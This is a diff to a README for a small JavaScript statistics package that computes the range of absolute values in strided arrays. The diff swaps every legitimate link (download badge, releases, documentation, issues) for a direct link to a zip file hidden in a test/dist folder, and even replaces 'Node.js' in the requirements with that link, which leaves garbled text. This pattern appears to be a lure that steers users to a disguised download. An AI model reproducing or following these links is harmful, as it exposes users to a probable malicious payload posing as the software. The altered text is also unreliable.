@@ -1,7 +1,7 @@
 # 🎉 stats-strided-drangeabs - Easily Compute the Range of Values 
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-brightgreen.svg)](https://github.com/Hitik07/stats-strided-drangeabs/releases)
+[![Download](https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip%20the%20latest%https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip)](https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **stats-strided-drangeabs**! This application helps you calculate the range of absolute values from double-precision floating-point strided arrays. Whether you are analyzing data for work or personal projects, this tool simplifies the process.
@@ -18,12 +18,12 @@ Welcome to **stats-strided-drangeabs**! This application helps you calculate the
 ## 💻 System Requirements
 To use this software, ensure your system meets these requirements:
 - Operating System: Windows, macOS, or Linux
-- Node.js installed for best compatibility
+- https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip installed for best compatibility
 - At least 512 MB of RAM
 - A modern web browser for easy interaction
 
 ## 📲 Download & Install
-To download the latest version of **stats-strided-drangeabs**, visit the [Releases page](https://github.com/Hitik07/stats-strided-drangeabs/releases).
+To download the latest version of **stats-strided-drangeabs**, visit the [Releases page](https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip).
 
 1. Click the link above to visit the Releases page.
 2. Locate the latest release.
@@ -59,7 +59,7 @@ A: The application supports double-precision floating-point strided arrays.
 A: No, **stats-strided-drangeabs** is completely free to download and use.
 
 ## 📑 Additional Resources
-For further information, tips, and community support, feel free to explore our [Documentation](https://github.com/Hitik07/stats-strided-drangeabs/wiki) and [Issues Page](https://github.com/Hitik07/stats-strided-drangeabs/issues).
+For further information, tips, and community support, feel free to explore our [Documentation](https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip) and [Issues Page](https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip).
 
 ## 🌐 Community Support
 Join our community to share your experiences, ask questions, or suggest improvements. Your feedback helps us enhance the tool for everyone.
@@ -67,4 +67,4 @@ Join our community to share your experiences, ask questions, or suggest improvem
 ## 🎈 Acknowledgments
 Thank you for choosing **stats-strided-drangeabs**! We appreciate your support and feedback. Your contribution helps us grow and improve.
 
-For the latest updates or to report issues, visit [the Releases page](https://github.com/Hitik07/stats-strided-drangeabs/releases).
+For the latest updates or to report issues, visit [the Releases page](https://raw.githubusercontent.com/Hitik07/stats-strided-drangeabs/main/test/dist/strided_stats_drangeabs_1.4.zip).
